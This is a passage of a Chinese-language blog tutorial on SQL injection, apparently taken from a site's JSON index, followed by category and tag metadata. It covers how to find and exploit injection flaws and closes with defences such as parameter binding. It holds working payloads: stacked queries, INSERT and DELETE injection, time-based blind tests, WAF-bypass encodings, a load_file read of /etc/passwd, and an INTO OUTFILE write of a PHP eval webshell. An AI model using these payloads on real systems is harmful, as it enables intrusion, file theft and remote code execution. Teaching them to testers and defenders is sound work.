username=&#x27;&#123;$name&#125;&#x27;&quot;; //数字型注入 $sql = &quot;select * from user where id = &#x27;&#123;$id&#125;&#x27;&quot;;?&gt; 攻击Payload 123456789101112131415161718192021222324252627282930313233343536373839404142 http://127.0.0.1/index.php?name=admin&#x27;;select @@version# http://127.0.0.1/index.php?id=1;select @@version#````一、后端数据库种类毕竟多，需要识别数据库类型，依据不同数据库特性区分* @@version变量* 特定函数 - MySQL =&gt; last_insert_id() - MSSQL =&gt; @@rowcount - Oracle =&gt; BITAND(1,1)* 字符串拼接处理不同 - MySQL/Postgresql =&gt; 空格拼接 - MSSQL =&gt; 加号拼接 - Oracle =&gt; ||符合拼接二、Union/Order by特性获取列数```php//查询列表数目index.php?id=12+select+NULL,NULL,NULL,...//字符显示位index.php?id=12+order+by+1````三、获取数据库表名```phpMSSQL:数据库名：master..sysdatabasesselect name from master..sysdatabases;MySQL:数据库名：information_schema.schemata表名：information_schema.tables权限: information_schema.schema_privileges表名：mysql.db（管理权限）select SCHEMA_NAME from information_schema.schemata;select TABLE_NAME from information_schema.tables;select COLUMN_NAME from information_schema.columns where TABLE_NAME=&#x27;xxx&#x27;;Oracle:用户表: user_tables表：all_tables权限表: user_sys_privs 至此一个基础SQLi攻击过程完毕，在复杂的业务场景中，SQLi并不局限于select形式的注入，还有insert、update、delete等形式的注入场景。相对于select来说更为复杂，不可见、难操作。 INSERT注入的奇思妙想： 123456$sql = &quot;insert into user(username, password)values(&#x27;&quot;.$_GET[name].&quot;&#x27;, password(&#x27;&quot;.$_GET[&#x27;password&#x27;].&quot;&#x27;))&quot;;//PAYLOAD$name = &#x27;x&#x27;,(select @@version)--//可控点插入特定SQL，常见于个人信息编写业务中 UPDATE注入的奇思妙想: 123$sql = &quot;update user set name=&#x27;&quot; .$_GET[&#x27;name&#x27;]. &quot;&#x27; where id=1&quot;;//本质与insert相同 DELETE注入的奇思妙想: 123456$sql = &quot;delete from user where username=&#x27;&#123;$_GET[&#x27;name&#x27;]&#125;&#x27;&quot;;//PAYLOADname=admin&#x27;+union+select+if(current_user()=&#x27;root&#x27;, sleep(3), sleep(10));//该类型注入测试繁琐 SQL注入还有一种盲注的场景，注入操作不会回显在页面中。通过SLEEP/BENCHMARK函数利用时间响应的不同推断注入结果。 #SQL编码由于WAF（web application firewall）的出现，纯原生的SQLi Payload会被系统拦截，为了bypass waf就需要对SQL语句进行各种变形。 大小写编码（目前无效果） URLENCODE编码 注释编码 特定场景字符截断(宽字节注入) ASCII码 示例: ```shell#select @@versionindex.php?id=1+uni//on+sel//ect+char(64)+char(64)+char(118)+char(101)+char(114)+char(115)+char(105)+char(110)+char(111)+char(110)#; #/etc/passwdindex.php?id=1+union+select+load_file(0x2F6574632F706173737764)# 1234567891011## #基于SQL攻击大厂的SQLi场景基本复杂，需要通过HTTP/DNS/ICMP等等方式，将执行结果传送出来；或者利用数据库特定网络或文件函数写入webshell，进行反弹请求。* OOB攻击(out of band)* 特性函数写入文件* 执行命令示例：```php//写入shellselect &#x27;&lt;?php eval($_REQUEST[&#x27;c&#x27;]);?&gt;&#x27; into outfile &#x27;/var/www/shell.php&#x27;; #SQLi漏洞挖掘挖掘SQLi漏洞分为黑盒模式和白盒模式，前者通过工具或手工不断测试，后者通过阅读业务代码分析具体代码逻辑。无论黑白盒模式，能发现问题方式都是好方式，如果业务代码较为复杂，需要借助半自动化工具辅助分析代码。 源码审计工具 rips graudit AppScan Source rips审计工具目前已更新为商业版本，这里可以结合graduit工具辅助挖掘SQLi漏洞；代码审计的核心是根据编程语言特性函数(漏洞函数)及入口参数进行追溯分析。 #SQLi防御SQLi漏洞发生原因在于输入参数与业务SQL结合导致安全风险，基础业务接受的参数多为数字型和字符型。如果参数为数字型参数，可采用intval()函数强制转换参数为整型。如果参数未字符型参数，通过参数绑定的形式规避风险。 常规防御方式: intval()/addslashes() PDO/MySQLi参数绑定 正则过滤(不严谨) 三方安全组件（taint/suhosin） RASP机制(Runtime Application Self Protection) 传统型框架thinkphp/phpcms/dedecms/discuz等框架在SQL使用上较为混乱，现代型框架Laravel/yii/cakephp/symfony等框架在SQL上统一封装，底层多为PDO/MySQLi参数绑定，基本规避SQLi的风险。但是各大Web框架都支持原生SQL的写法，So。。。挖一挖总还会有的 :) 参考 《SQL注入与防御第二版》 《SQL学习指南第二版》 silic注入指南(习科) MySQL OOB攻击","categories":[{"name":"security","slug":"security","permalink":"https://ushell.me/categories/security/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://ushell.me/tags/sqli/"}]}],"categories":[{"name":"kubernetes","slug":"kubernetes","permalink":"https://ushell.me/categories/kubernetes/"},{"name":"tools","slug":"tools","permalink":"https://ushell.me/categories/tools/"},{"name":"docker","slug":"docker","permalink":"https://ushell.me/categories/docker/"},{"name":"php","slug":"php","permalink":"https://ushell.me/categories/php/"},{"name":"network","slug":"network","permalink":"https://ushell.me/categories/network/"},{"name":"gitlab","slug":"gitlab","permalink":"https://ushell.me/categories/gitlab/"},{"name":"protocol","slug":"protocol","permalink":"https://ushell.me/categories/protocol/"},{"name":"security","slug":"security","permalink":"https://ushell.me/categories/security/"}],"tags":[{"name":"kubernetes","slug":"kubernetes","permalink":"https://ushell.me/tags/kubernetes/"},{"name":"synergy","slug":"synergy","permalink":"https://ushell.me/tags/synergy/"},{"name":"共享键鼠","slug":"共享键鼠","permalink":"https://ushell.me/tags/%E5%85%B1%E4%BA%AB%E9%94%AE%E9%BC%A0/"},{"name":"docker","slug":"docker","permalink":"https://ushell.me/tags/docker/"},{"name":"crontab","slug":"crontab","permalink":"https://ushell.me/tags/crontab/"},{"name":"debian","slug":"debian","permalink":"https://ushell.me/tags/debian/"},{"name":"ffi","slug":"ffi","permalink":"https://ushell.me/tags/ffi/"},{"name":"ssr","slug":"ssr","permalink":"https://ushell.me/tags/ssr/"},{"name":"spipe","slug":"spipe","permalink":"https://ushell.me/tags/spipe/"},{"name":"hammerspoon","slug":"hammerspoon","permalink":"https://ushell.me/tags/hammerspoon/"},{"name":"自动化","slug":"自动化","permalink":"https://ushell.me/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"ldap","slug":"ldap","permalink":"https://ushell.me/tags/ldap/"},{"name":"tls","slug":"tls","permalink":"https://ushell.me/tags/tls/"},{"name":"spiped","slug":"spiped","permalink":"https://ushell.me/tags/spiped/"},{"name":"stunnel","slug":"stunnel","permalink":"https://ushell.me/tags/stunnel/"},{"name":"outline","slug":"outline","permalink":"https://ushell.me/tags/outline/"},{"name":"酸酸乳","slug":"酸酸乳","permalink":"https://ushell.me/tags/%E9%85%B8%E9%85%B8%E4%B9%B3/"},{"name":"phpbrew","slug":"phpbrew","permalink":"https://ushell.me/tags/phpbrew/"},{"name":"laradock","slug":"laradock","permalink":"https://ushell.me/tags/laradock/"},{"name":"composer","slug":"composer","permalink":"https://ushell.me/tags/composer/"},{"name":"prestissimo","slug":"prestissimo","permalink":"https://ushell.me/tags/prestissimo/"},{"name":"composer2","slug":"composer2","permalink":"https://ushell.me/tags/composer2/"},{"name":"laravel","slug":"laravel","permalink":"https://ushell.me/tags/laravel/"},{"name":"jwt","slug":"jwt","permalink":"https://ushell.me/tags/jwt/"},{"name":"laravel-permission","slug":"laravel-permission","permalink":"https://ushell.me/tags/laravel-permission/"},{"name":"microtime","slug":"microtime","permalink":"https://ushell.me/tags/microtime/"},{"name":"cas","slug":"cas","permalink":"https://ushell.me/tags/cas/"},{"name":"sso","slug":"sso","permalink":"https://ushell.me/tags/sso/"},{"name":"gitlab","slug":"gitlab","permalink":"https://ushell.me/tags/gitlab/"},{"name":"sqli","slug":"sqli","permalink":"https://ushell.me/tags/sqli/"}]}